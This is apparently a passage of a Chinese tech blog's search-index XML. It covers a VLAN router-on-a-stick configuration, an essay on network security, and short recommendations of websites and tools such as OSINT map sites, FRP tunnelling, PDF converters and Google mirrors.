&#x2F;&#x2F;配置上联接口为trunk接口，trunk接口同时可以允许两个vlan通过</p><p>路由器配置</p><p>Interface f0&#x2F;0   &#x2F;&#x2F;进入路由器下联交换机的接口</p><p>No shutdown  &#x2F;&#x2F;打开接口</p><p>Exit</p><p>Interface f0&#x2F;0.1   &#x2F;&#x2F;进入路由器的虚拟子接口</p><p>Encapsulation dot1q 10              &#x2F;&#x2F;配置子接口属于</p><p>vlan10 Ip address 192.168.1.254 255.255.255.0    &#x2F;&#x2F;配置vlan10 PC的网关IP地址</p><p>Interface f0&#x2F;0.2</p><p>Encapsulaiton dot1q 20          &#x2F;&#x2F;配置子接口属于vlan20</p><p>Ip address 192.168.2.254 255.255.255.0  &#x2F;&#x2F;配置vlan20 的PC的网关IP地址</p><p>此时测试PC1和PC2的通信，正常情况下可以ping通，此时实现了不同vlan的PC通过路由器实现了三层通信，因为交换机上联路由器只有一个接口，此项技术称之为：单臂路由</p><p>还有一个可以替代路由器的东西，万一路由器出现问题了呢？于是便引入三层交换机。</p><p>把三层交换机替代掉路由器，又该怎么配置呢？如图所示：</p><p><img src="https://static.luozhinet.com/58/1187635f114133932ad0b2ca6d0c5e"></p>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 地址 </tag>
            
            <tag> ping </tag>
            
            <tag> 百度 </tag>
            
            <tag> 交换机 </tag>
            
            <tag> vlan </tag>
            
            <tag> trunk </tag>
            
            <tag> vlan10 </tag>
            
            <tag> switchport </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全吗？</title>
      <link href="/posts/0ddde9bf2629/"/>
      <url>/posts/0ddde9bf2629/</url>
      
        <content type="html"><![CDATA[<p>互联网的发展，让整个世界变成了一个地球村，无数的数据从我们的生活中溜过，极大地方便的我们的生活。比如QQ、微信社交软件成为我们生活的一部分，貌似已经离不开它们了！</p><p>0和1看似很简单的数字，却让整个人类开启了信息革命！比如现在的很火的，物联网、机器学习，人工智能。在我还在上高中的时候，谁能想到智能手机能发展那么快！从山寨机–&gt;诺基亚–&gt;智能手机，并且网络的速度变得越来越快！从当初直板手机的GPRS网络，到GSM（俗称2G网络），到WCDMA（也就是3G）网络，再到今天的LTE（4G网络），可是人类还是不满足，又开启了5G网络，网络变得越来越快！<img src="https://static.luozhinet.com/bc/d0f2ddb7fec327c4de33f0085a91b2"></p><p>网络发展巨快，还记得高中的时候安卓设备的版本才2.2，现在的软件的迭代速度真的让我吃惊！现在配置很低的手机大概最低都是安卓5.0了吧！网络的快速发展也催生了Tencent、Alibaba、百度这些科技巨头。在众多异构网络上，让整个世界串在了一起，真的无法想象，一旦网络瘫痪，世界将会变成什么样子。</p><p>现在的人们几乎一半的时间都花费在虚拟的网络上，网络真的安全吗？</p><p>你知道网络管理吗？网络管理是这样定义的：网络管理包括对硬件、软件、和人力的使用、综合与协调，以便对网络资源进行监视、测试、配置、分析、评价和控制，这样就能以合理的价格满足网络的一些需求，如实时运行性能、服务质量等。网络管理简称网管。</p><p>现在不少的国家都采取对网络的限制、控制、过滤，这些都是很正常的行为，不光我们国家，很多国家都采取对网络的管理。包括日本、韩国、英国、法国、俄罗斯等，你们认为美国不进行网络监控吗？答案是否定的！要不然怎么会有斯诺登事件呢？<img src="https://static.luozhinet.com/d2/37c52d51746f7dc875441a0935338c"></p><p>现在的社会网络变得越来越不安全，越来越让我们感到不安！信息泄露，个人隐私根本都不是隐私，隐私都是白菜价，1毛钱甚至都不值钱都出售给其他人了，骚扰电话不断，越来越让我们感到苦恼，现在的我们该做些什么呢？难道说我们不用电子设备，不去触碰它，我们的隐私就安全了！错！现在的社会充满了摄像头和监控，赤裸的在大庭广众之下，我们又有什么办法呢！</p><p>网络这个东西在传输的过程中，在数不清U型管中跑来跑去，就像一个花瓶，这个花瓶，个太大了，人们想法就把这个花瓶彻底打碎，变成能够传输的碎片，传到其他人手中再重新组装成一个和原来一样花瓶。于是网络催生了各种协议，来保证这个花瓶的可用性。所以呢，人们能把花瓶打碎再重新复原组装起来，也能把这些碎片备份成很多份，以便于控制和管理。所以网络从来都不是安全的，都是可控的。</p><p>网络是个双刃剑，怎么使用才是最重要的，网络的使用要遵守相关的法律和政策，作为一个普通人是无法和国家机器抗衡的。要做的只有管好我们自己，爱自己的国家，维护国家的尊严！</p>]]></content>
      
      
      <categories>
          
          <category> 技术教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络 </tag>
            
            <tag> 隐私 </tag>
            
            <tag> 资源 </tag>
            
            <tag> 使用 </tag>
            
            <tag> 软件 </tag>
            
            <tag> 百度 </tag>
            
            <tag> 花瓶 </tag>
            
            <tag> 管理 </tag>
            
            <tag> 打碎 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用网站工具汇总</title>
      <link href="/posts/3872ce211e30/"/>
      <url>/posts/3872ce211e30/</url>
      
        <content type="html"><![CDATA[<h2 id="一、常见的搜索引擎（遇到需要通过关键字解题时即可使用）"><a href="#一、常见的搜索引擎（遇到需要通过关键字解题时即可使用）" class="headerlink" title="一、常见的搜索引擎（遇到需要通过关键字解题时即可使用）"></a>一、常见的搜索引擎（遇到需要通过关键字解题时即可使用）</h2><p>1.百度<a href="https://www.baidu.com/">https://www.baidu.com/</a></p><p>2.搜狗<a href="https://www.sogou.com/">https://www.sogou.com/</a></p><p>3.必应<a href="https://cn.bing.com/">https://cn.bing.com/</a></p><p>4.360好搜<a href="https://www.so.com/">https://www.so.com/</a>  （图片不能超过2M）</p><p>5.谷歌google.com.hk  （需要翻）</p><p>6.yandex搜索（俄罗斯的） <a href="https://yandex.com/">https://yandex.com/</a></p><p>7.聚合搜索引擎（融合了谷歌百度）：<a href="http://www.gobaidugle.com/">http://www.gobaidugle.com</a></p><p>8.快搜<a href="https://search.chongbuluo.com/">https://search.chongbuluo.com/</a>   （几十种常用信息检索方式）</p><h2 id="二、常见的识图网站-x2F-工具（国内网站用来搜国内的图，国外的网站搜国外的图）"><a href="#二、常见的识图网站-x2F-工具（国内网站用来搜国内的图，国外的网站搜国外的图）" class="headerlink" title="二、常见的识图网站&#x2F;工具（国内网站用来搜国内的图，国外的网站搜国外的图）"></a>二、常见的识图网站&#x2F;工具（国内网站用来搜国内的图，国外的网站搜国外的图）</h2><p>1.百度识图<a href="https://graph.baidu.com/pcpage/index?tpl%5C_from=pc">https://graph.baidu.com/pcpage/index?tpl\_from=pc</a></p><p>2.搜狗识图<a href="https://pic.sogou.com/">https://pic.sogou.com/</a></p><p>3.360好搜识图<a href="http://st.so.com/">http://st.so.com/</a></p><p>4.谷歌识图<a href="https://images.google.com/">https://images.google.com/</a>  （需要翻）</p><p>5.yandex识图<a href="https://yandex.com/images/">https://yandex.com/images/</a></p><p>6.花伴侣APP：识别各种花（手机应用市场都可以下载到）</p><p>7.看图识狗<a href="https://cn.bing.com/visualsearch/Microsoft/WhatDog">https://cn.bing.com/visualsearch/Microsoft/WhatDog</a></p><p>8.微信小程序搜索识鸟、识花等关键词可以打开一些好用的小程序</p><p>9.百度APP应用中的百度浏览器识图（一定要APP里面的，和百度识图不一样！！）</p><p>10.淘宝等网购网站识图</p><p>11.<a href="https://www.toolnb.com/tools/baseshibie.html">https://www.toolnb.com/tools/baseshibie.html</a>  （上传图片自动识别物品）</p><h2 id="三、常用的地图网站"><a href="#三、常用的地图网站" class="headerlink" title="三、常用的地图网站"></a>三、常用的地图网站</h2><p>1. 标准地图服务<a href="http://bzdt.ch.mnr.gov.cn/">http://bzdt.ch.mnr.gov.cn/</a>  （可下载高清地图，同时可以自己制图，还有全国各地区水系，铁路等等高清的图片）</p><p>2.高清地图<a href="http://www.onegreen.net/maps/m/">http://www.onegreen.net/maps/m/</a> （查询世界各国、全国各省市政区地图）</p><p>3.世界古代地图<a href="https://www.davidrumsey.com/">https://www.davidrumsey.com/</a> （全球的古代地图都可以看到）</p><p>4.中国古地图<a href="https://digitalatlas.ascdc.sinica.edu.tw/">https://digitalatlas.ascdc.sinica.edu.tw/</a></p><p>4.地图类的聚合搜索<a href="https://www.earthol.com/">https://www.earthol.com/</a> （可以切换谷歌、百度、高德、腾讯的地图）</p><h2 id="四．常用工具"><a href="#四．常用工具" class="headerlink" title="四．常用工具"></a>四．常用工具</h2><p>1.摩天档案馆<a href="https://www.motianguan.com/wiki/%E9%A6%96%E9%A1%B5">https://www.motianguan.com/wiki/%E9%A6%96%E9%A1%B5</a>  （摩天大楼数据库、档案馆，收录全球各地高层、超高层建筑数据信息，并提供各城市、各国家的摩天大楼排行榜）</p><p>2.AI人工智能图片放大<a href="https://bigjpg.com/">https://bigjpg.com/</a></p><p>3.日出日没时刻<a href="https://richurimo.bmcx.com/">https://richurimo.bmcx.com/</a>  （根据经纬度或省份查询日出日落时间）</p><p>4.天气气象</p><p>①全球气象<a href="https://earth.nullschool.net/zh-cn/">https://earth.nullschool.net/zh-cn/</a>  （查看全球风、气象和海洋状况的地图）</p><p>②<a href="https://www.windy.com/">https://www.windy.com</a>  （查看全世界的卫星云图、风向、湿度、温度、云层等信息，还有飞机航线信息和气象站的实时图像，可以在右下角自行切换，右上角则可以设置信息的单位，和经纬度等。点击自己所在地就可以查看详细天气信息，国内较卡，建议翻了再看）</p><p>③<a href="https://www.ventusky.com/">https://www.ventusky.com/</a> 全球气象图（功能强大）</p><p>5.<a href="https://tianqi.2345.com/wea/_history/57036.htm">https://tianqi.2345.com/wea\_history/57036.htm</a>  （全国各地历史天气查询，很有用）</p><p>6.全国高速路况<a href="https://www.icauto.com.cn/gonglu/">https://www.icauto.com.cn/gonglu/</a>  （高速路况实时滚动播报）</p><p>7.遇到特别糊、黑的图可以使用美图秀秀等图片处理软件</p><p>①<a href="https://www.shulijp.com/tool/image/edit/dehaze.html">https://www.shulijp.com/tool/image/edit/dehaze.html</a>  （对浓雾天气下拍摄，导致细节无法辨认的图像进行去雾处理，还原更清晰真实的图像）</p><p>②<a href="https://www.shulijp.com/tool/image/edit/contrastEnhance.html">https://www.shulijp.com/tool/image/edit/contrastEnhance.html</a>  （图像对比度增强是调整过暗或者过亮图像的对比度，使图像更加鲜明）</p><p>③<a href="https://www.shulijp.com/tool/image/edit/stretch/_restore.html">https://www.shulijp.com/tool/image/edit/stretch\_restore.html</a>  （拉伸图像恢复是自动识别过度拉伸的图像，将图像内容恢复成正常比例）</p><p>④<a href="https://www.shulijp.com/tool/image/edit/colourize.html">https://www.shulijp.com/tool/image/edit/colourize.html</a>  （智能识别黑白图像内容并填充色彩，使黑白图像变得鲜活）</p><p>8.街景地图</p><p> ①谷歌街景<a href="https://www.google.com/maps/">https://www.google.com/maps/</a>  （看国外的街景，移动右下角的小黄人到蓝点或者蓝色的道路上，需要翻）</p><p> ②百度街景<a href="https://www.earthol.org/">https://www.earthol.org/</a>  （看国内的街景）</p><p> ③腾讯街景：打开腾讯地图APP，用语音说“街景”即可</p><p>9.通过测量物体和阴影之间的比例关系确定拍摄时间、利用太阳和阴影进行地理定位  <a href="https://www.suncalc.org/">https://www.suncalc.org/</a></p><p>详细学习的文章参考：</p><p>1)<a href="https://www.bellingcat.com/resources/2021/05/18/unsure-when-a-video-or-photo-was-taken-how-to-tell-by-measuring-the-length-of-shadows/">https://www.bellingcat.com/resources/2021/05/18/unsure-when-a-video-or-photo-was-taken-how-to-tell-by-measuring-the-length-of-shadows/</a></p><p>2)<a href="https://www.bellingcat.com/resources/2020/12/03/using-the-sun-and-the-shadows-for-geolocation/">https://www.bellingcat.com/resources/2020/12/03/using-the-sun-and-the-shadows-for-geolocation/</a></p><p>    (友情提示：鉴于网站纯英文，建议安装百度翻译的插件，大佬除外)</p><p>10.卫星图像</p><p>①谷歌地图电脑版</p><p>②<a href="https://apps.sentinel-hub.com/sentinel-playground/">https://apps.sentinel-hub.com/sentinel-playground/</a>  提供免费卫星图像，可用于获取该区域的近期图像。世界大部分地区每周拍摄两次，但图像的分辨率低于从商业卫星服务购买的分辨率</p><p>③天地图<a href="https://www.tianditu.gov.cn/">https://www.tianditu.gov.cn/</a>  （中国官方的，很好用）</p><p>④<a href="http://www.bigemap.com/">http://www.bigemap.com/</a>  （数据多、很强大，可以免费申请免费的PC版，若查看更多的信息需要付费，但平时用到的已经足够）</p><p>11.航空线路</p><p>①<a href="https://zh.flightaware.com/">https://zh.flightaware.com/</a>  （注册之后可以查看最近三个月的某一航班信息）</p><p>②<a href="https://www.flightradar24.com/">https://www.flightradar24.com/</a>  （手机版APP貌似需要付费）</p><p>12.全景地图观看</p><p>①千亿看中国<a href="http://www.bigpixel.cn/">http://www.bigpixel.cn/</a></p><p>②720云 <a href="https://720yun.com/">https://720yun.com/</a></p><p>③全景客<a href="http://www.quanjingke.com/">http://www.quanjingke.com/</a></p><p>④极像素<a href="https://www.sigoo.com/">https://www.sigoo.com/</a></p><p>⑤<a href="https://www.skypixel.com/">https://www.skypixel.com/</a>  （有世界各地的航拍图片）</p><p>13.图虫EXIF查看器<a href="https://exif.tuchong.com/">https://exif.tuchong.com/</a>  （可以读取一张照片背后的信息如拍摄地点时间等）</p><p>14.<a href="https://bigjpg.com/">https://bigjpg.com/</a>  （AI人工智能图片放大）</p><p>15.<a href="http://tool.pfan.cn/lonlat">http://tool.pfan.cn/lonlat</a>  （根据输入的经纬度进行定位）</p><h2 id="五、很“黑科技”的网站"><a href="#五、很“黑科技”的网站" class="headerlink" title="五、很“黑科技”的网站"></a>五、很“黑科技”的网站</h2><p>1.<a href="https://lines.chromeexperiments.com/">https://lines.chromeexperiments.com/</a>  根据你在画板上绘制的任意形状在地球上的某个地方将线段匹配出来</p><p>（国内打开速度快但加载速度慢，画的线段有长度规定，大概在10cm左右，但是数量好像没规定）</p><p>2.<a href="https://seaside-station.com/">https://seaside-station.com/</a>  （日本所以可以看到海的车站图集）</p><p>3.<a href="https://www.freemaptools.com/">https://www.freemaptools.com/</a>  （查看在地图上单击的点周围的半径、查找单击的两点之间的距离、找出命名点A和B之间的距离、计算在地图上指定的封闭区域）</p><p>4.<a href="https://2tool.top/">https://2tool.top/</a>  查任意国内网页的快照</p><p>5.<a href="https://web.archive.org/">https://web.archive.org/</a>  查任意国外网页的快照（访问速度很慢）</p><p>6.<a href="https://www.toolnb.com/tools/cheshibie.html">https://www.toolnb.com/tools/cheshibie.html</a>  （根据车的照片识别车辆信息）</p><p>7.<a href="https://www.8684.cn/">https://www.8684.cn/</a>  （公交、地铁和火车的线路、换乘、站点信息查询）</p><p>8.<a href="https://vocalremover.org/ch/">https://vocalremover.org/ch/</a>  （借助强大的AI算法将音频中的人声与背景音乐分离开来）</p><p>9.各种大数据的查询网站<a href="https://www.guidebook.top/data/">https://www.guidebook.top/data/</a></p>]]></content>
      
      
      <categories>
          
          <category> 网站推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免费 </tag>
            
            <tag> 注册 </tag>
            
            <tag> 网页 </tag>
            
            <tag> 搜索引擎 </tag>
            
            <tag> 网站 </tag>
            
            <tag> 软件 </tag>
            
            <tag> 图片 </tag>
            
            <tag> 人声 </tag>
            
            <tag> tps </tag>
            
            <tag> 地图 </tag>
            
            <tag> 图像 </tag>
            
            <tag> 街景 </tag>
            
            <tag> 百度 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>高速远程办公、内网穿透-SAKURA FRP</title>
      <link href="/posts/59ad5dc4c5b1/"/>
      <url>/posts/59ad5dc4c5b1/</url>
      
        <content type="html"><![CDATA[<p>远程办公、内网穿透，SAKURA FRP真的是太爽了！爆赞！</p><p>关于FRP，FRP是做什么？能做什么？这个之前出过教程，如何使用，如何部署！这次就不再赘述了！如果想要学着部署的话，链接直达：Windows下非常好用的内网穿透工具FRP</p><h2 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h2><p><img src="http://139.198.176.82:86/data/images/2022-05-13/e3d8fa14a34c4f520e9dd028e727a931.png"></p><p>记得之前，这个是用来联网玩我的世界的！</p><p>记得使用SAKURA FRP服务的时候，可以做小网站，远程桌面等，但不要干违法的事哦！查封会连累大家都不能用呢！</p><p>免费用户，拥有以下权限:</p><table><tbody><tr><td>隧道数量</td><td>5 条</td></tr><tr><td>隧道限速</td><td>10 Mbps</td></tr></tbody></table><p>可以通过每日签到获取免费流量！速度也不算慢，至少比向日葵的80kB好太多了！</p><p><img src="https://static.luozhinet.com/fb/58c57ae917a5c8af3930dd888eb248"></p><h2 id="使用："><a href="#使用：" class="headerlink" title="使用："></a>使用：</h2><p>为什么你需要端口穿透？穿后台、建网站、做调试、开游戏……</p><p>解决没有公网 IP 的难题，就用樱花FRP</p><p><img src="https://static.luozhinet.com/23/31422f4ccb4d8a21ff233ec183f3ff"></p><p>SAKURA FRP运营时间那么久了，文档编辑解释的很详细了！具体在这就不在赘述了！详细内容，如何配置与连接，请参考官方文档：<a href="https://doc.natfrp.com/#/">https://doc.natfrp.com/#/</a></p><p>如果还不会，说明与此应用绝缘，抱歉，任何人都帮不了你，记住，任何人！想信自己可以弄成功！</p><p>后台有详细的说明：</p><p><img src="https://static.luozhinet.com/0f/81ba12f33cf4b8316d20c0f017e49c"></p><p>具体后台操作，请注册账号，尽情的使用吧！</p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p><img src="https://static.luozhinet.com/22/bb85b1b1994ef24af9f8867b54a7d4"></p><p>良心！鸣谢站长对于微小站长的支持！</p><p>网址直达：<a href="https://www.natfrp.com/">https://www.natfrp.com/</a></p>]]></content>
      
      
      <categories>
          
          <category> 网站推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免费 </tag>
            
            <tag> 注册 </tag>
            
            <tag> 网站 </tag>
            
            <tag> 后台 </tag>
            
            <tag> 良心 </tag>
            
            <tag> 联网 </tag>
            
            <tag> 游戏 </tag>
            
            <tag> frp </tag>
            
            <tag> 穿透 </tag>
            
            <tag> sakura </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>免费PDF转WORD网站</title>
      <link href="/posts/c821481d77c0/"/>
      <url>/posts/c821481d77c0/</url>
      
        <content type="html"><![CDATA[<p>PDF转TXT、Word、PPT、EXCEL等格式，确实是刚需，收藏用！</p><p>以下网站，均不需要下载软件，干净且良心！爆赞！！！</p><h2 id="1、ALL-to-ALL-在线格式转换"><a href="#1、ALL-to-ALL-在线格式转换" class="headerlink" title="1、ALL to ALL 在线格式转换"></a>1、ALL to ALL 在线格式转换</h2><p><img src="https://static.luozhinet.com/2e/d8735354495477bafea0b1202e2ae2"></p><p>支持格式众多，音频、视频、文档等，而且100%免费，唯一缺点，文档转换大小限制10M。</p><p>链接直达：ALL to ALL 在线格式转换</p><h2 id="2、easy-PDF"><a href="#2、easy-PDF" class="headerlink" title="2、easy PDF"></a>2、easy PDF</h2><p><img src="https://static.luozhinet.com/1e/c5076a3a1bc48ad7599beba9dc9140"></p><p>从PDF到Easy，基本涵盖了日常工作的格式，而且网站承诺：免费、线上、匿名！</p><p>链接直达：easy PDF</p><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><p><em>All to</em> <em>A**ll</em> ：<em><a href="https://www.alltoall.net/">https://www.alltoall.net/</a></em></p><p><em>Easy PDF</em>：<em><a href="https://easypdf.com/cn">https://easypdf.com/cn</a></em></p>]]></content>
      
      
      <categories>
          
          <category> 网站推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免费 </tag>
            
            <tag> 格式 </tag>
            
            <tag> 转换 </tag>
            
            <tag> 视频 </tag>
            
            <tag> 网站 </tag>
            
            <tag> 软件 </tag>
            
            <tag> pdf </tag>
            
            <tag> 良心 </tag>
            
            <tag> all </tag>
            
            <tag> easy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>全网音乐下载播放-MusicDer</title>
      <link href="/posts/c60221d6b1b5/"/>
      <url>/posts/c60221d6b1b5/</url>
      
        <content type="html"><![CDATA[<p>页面简洁、精致、小而美的音乐播放下载网站-MusicDer！</p><h2 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h2><p>一个免费下载音乐歌曲的网站，里面的资源相当全，界面也干净！可以在线试听，不需要下载什么软件，在网站搜索歌曲名称即可下载！</p><h2 id="界面："><a href="#界面：" class="headerlink" title="界面："></a>界面：</h2><p><img src="https://static.luozhinet.com/b5/fc0c38cf50345ac8184d29a6daf75a"></p><p><img src="https://static.luozhinet.com/5b/5584c5fb39aa1ee2c848d5951ea8ae"></p><h2 id="传送门"><a href="#传送门" class="headerlink" title="传送门:"></a>传送门:</h2><p>网址直达：<a href="https://musicder.com/">https://musicder.com/</a></p>]]></content>
      
      
      <categories>
          
          <category> 网站推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免费 </tag>
            
            <tag> 界面 </tag>
            
            <tag> 资源 </tag>
            
            <tag> 网站 </tag>
            
            <tag> 软件 </tag>
            
            <tag> 下载 </tag>
            
            <tag> musicder </tag>
            
            <tag> 歌曲 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Google镜像站</title>
      <link href="/posts/6631458408e8/"/>
      <url>/posts/6631458408e8/</url>
      
        <content type="html"><![CDATA[<p>Google确实是好的搜索引擎，Google能为我服务就好，其他不关心，关键是它离国人挺远不是吗？相比国内某度，还是不作比较吧。。。</p><hr><p>送几个Google镜像（仅供学习）：</p><ul><li><a href="https://siguso.com/google/">https://siguso.com/google/</a> （Google网页和学术,墙裂推荐）</li><li><a href="https://jia110.github.io/">https://jia110.github.io/</a>   （Google网页和学术,墙裂推荐）</li><li><a href="http://www.vovososo.com/">http://www.vovososo.com</a> (Google学术)</li><li><a href="https://ac.scmor.com/">https://ac.scmor.com/</a>  （Google学术）</li><li><a href="http://scholar.hedasudi.com/">http://scholar.hedasudi.com/</a>  （Google学术）</li><li><a href="https://gg.i-research.edu.eu.org/%EF%BC%88Google%E5%AD%A6%E6%9C%AF%EF%BC%89">https://gg.i-research.edu.eu.org/（Google学术）</a></li><li><a href="https://go.judd.workers.dev/">https://go.judd.workers.dev/</a>  （Google学术）</li><li><a href="http://g.histsci.org/">http://g.histsci.org/</a> （Google学术）</li><li><a href="https://google.zenith.gq/">https://google.zenith.gq/</a>  （Google网页）</li><li><a href="https://go.judd.workers.dev/%EF%BC%88Google%E7%BD%91%E9%A1%B5%EF%BC%89">https://go.judd.workers.dev/（Google网页）</a></li></ul><p>感觉够用了，我也没收集多少，凑合用吧！</p><p>2022.01.09更新</p><hr><p>注：Google镜像站不要搜索敏感词，不可违反中国法律！</p><hr><p>授人以鱼不如授人以渔，refence：</p><p><a href="https://github.com/aploium/zmirror%EF%BC%88python%E5%86%99%E7%9A%84%EF%BC%89">https://github.com/aploium/zmirror（python写的）</a></p><p><a href="https://github.com/cuber/ngx/_http/_google/_filter/_module/blob/master/README.zh-CN.md%EF%BC%88Nginx%E6%A8%A1%E5%9D%97%EF%BC%89">https://github.com/cuber/ngx\_http\_google\_filter\_module/blob/master/README.zh-CN.md（Nginx模块）</a></p><p><a href="https://www.moerats.com/archives/445/%EF%BC%88LNMP%EF%BC%89">https://www.moerats.com/archives/445/（LNMP）</a></p><p><a href="https://github.com/searx/searx">https://github.com/searx/searx</a></p><p><a href="https://github.com/EtherDream/jsproxy">https://github.com/EtherDream/jsproxy</a></p><p>Google确实是好的搜索引擎，Google能为我服务就好，其他不关心，关键是它离国人挺远不是吗？相比国内某度，还是不作比较吧。。。</p>]]></content>
      
      
      <categories>
          
          <category> 网站推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 镜像 </tag>
            
            <tag> google </tag>
            
            <tag> 学术 </tag>
            
            <tag> 网页 </tag>
            
            <tag> 搜索引擎 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>微软4K壁纸，它来了！</title>
      <link href="/posts/88228d912ad9/"/>
      <url>/posts/88228d912ad9/</url>
      
        <content type="html"><![CDATA[<p>MicrosoftDesign，不愧是微软，整合自身资源，集合4K壁纸资源，主要是大众可以随意下载观看！</p><p>话不多说，来欣赏一下截图吧：</p><p><img src="https://static.luozhinet.com/31/f1b36d15af1feb83d3c880913fe717"></p><p><img src="https://static.luozhinet.com/68/cbf041c95fe83f0d8012a2d2ba9f44"></p><p><img src="https://static.luozhinet.com/2a/12d501b30543483ae0721daa9f2ed9"></p><p>看到现在，估计有人想下载原图看看了！</p><p>#链接直达：<a href="https://wallpapers.microsoft.design/">https://wallpapers.microsoft.design/</a></p>]]></content>
      
      
      <categories>
          
          <category> 网站推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 资源 </tag>
            
            <tag> 下载 </tag>
            
            <tag> 直达 </tag>
            
            <tag> 壁纸 </tag>
            
            <tag> 截图 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>绿色纯净下载网站-软猫下载</title>
      <link href="/posts/1ec0df688f03/"/>
      <url>/posts/1ec0df688f03/</url>
      
        <content type="html"><![CDATA[<p>软猫下载-自称纯净无插件的软件 APP 下载平台！</p><h2 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h2><p>软猫下载提供多方面的软件下载服务，基本覆盖日常软件使用的方方面面，做的很不错，整体网站环境给人感觉很舒适，不过网站有少量的广告。</p><p>软猫下载提供普通下载和高速下载，高速下载需要注册账户才能使用，普通下载则不需要。</p><h2 id="预览："><a href="#预览：" class="headerlink" title="预览："></a>预览：</h2><p><img src="https://static.luozhinet.com/28/f46b3d5a36103f1cc31b9db334dfbd"></p><p><img src="https://static.luozhinet.com/1e/5bb37e3db78b64bc0dadeb6506e857"></p><p><img src="https://static.luozhinet.com/c1/625356590dbcfa47e0c91d6834013c"></p><h2 id="地址："><a href="#地址：" class="headerlink" title="地址："></a>地址：</h2><p>直达：<a href="https://www.softmall.net/">https://www.softmall.net/</a></p>]]></content>
      
      
      <categories>
          
          <category> 网站推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 插件 </tag>
            
            <tag> 注册 </tag>
            
            <tag> 网站 </tag>
            
            <tag> 软件 </tag>
            
            <tag> 下载 </tag>
            
            <tag> 直达 </tag>
            
            <tag> 普通 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CrxDL-Chrome扩展离线下载</title>
      <link href="/posts/f30c3df9c2fc/"/>
      <url>/posts/f30c3df9c2fc/</url>
      
        <content type="html"><![CDATA[<p>大家时间宝贵，不需要关注什么公众号才能下载扩展之类的，对于此我也是比较痛恨的！</p><h2 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h2><p>CrxDL提供Chrome扩展插件Crx离线安装包，提供了常见的油猴插件、Infinity、Proxy SwitchyOmega等众多热门插件。</p><h2 id="界面"><a href="#界面" class="headerlink" title="界面:"></a>界面:</h2><p><img src="https://static.luozhinet.com/03/d6ba63d04b396df556da5414e56693"></p><h2 id="传送门："><a href="#传送门：" class="headerlink" title="传送门："></a>传送门：</h2><p><a href="https://crxdl.com/">https://crxdl.com/</a></p>]]></content>
      
      
      <categories>
          
          <category> 网站推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 界面 </tag>
            
            <tag> 插件 </tag>
            
            <tag> 油猴插件 </tag>
            
            <tag> proxy </tag>
            
            <tag> crx </tag>
            
            <tag> crxdl </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UP云搜-海量资源任你搜</title>
      <link href="/posts/6f929ba7ef0a/"/>
      <url>/posts/6f929ba7ef0a/</url>
      
        <content type="html"><![CDATA[<p>UP云搜-原阿里云搜，资源全，热度高，下载快，更新及时！</p><h2 id="介绍："><a href="#介绍：" class="headerlink" title="介绍："></a>介绍：</h2><p>云盘搜索的网站有很多，网盘也分为了很多网盘，比如老大哥百度网盘，还有一些网盘蓝奏云，Google云盘，都有衍生的云盘搜索网站！</p><p>今天介绍的是UP云搜，搜索学习资料，小说、视频等都不在话下！当然不正经的也能搜得到，哈哈哈！</p><h2 id="界面："><a href="#界面：" class="headerlink" title="界面："></a>界面：</h2><p><img src="https://static.luozhinet.com/33/a9b0473a28bc59e181c83768a9feeb"></p><p><img src="https://static.luozhinet.com/8c/f51ecef536e1f0af290a0d4d2b0343"></p><p><img src="https://static.luozhinet.com/4a/8f00a0c922e198209e1589455650db"></p><p>真的是学习的好帮手，利用互联网资源，抓紧时间开始学习吧！</p><p>加油吧！少年！攀登一座山，后面的路就变得没那么崎岖了！</p><h2 id="网站地址："><a href="#网站地址：" class="headerlink" title="网站地址："></a>网站地址：</h2><p><a href="https://www.upyunso.com/">https://www.upyunso.com/</a></p>]]></content>
      
      
      <categories>
          
          <category> 网站推荐 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网盘 </tag>
            
            <tag> 搜索 </tag>
            
            <tag> 资源 </tag>
            
            <tag> 视频 </tag>
            
            <tag> 网站 </tag>
            
            <tag> 云搜 </tag>
            
            <tag> 云盘 </tag>
            
            <tag> 蓝奏云 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个开始-开始你的每一次探索</title>
      <link href="/posts/8961d9f399c4/"/>
      <url>/posts/8961d9f399c4/</url>
      
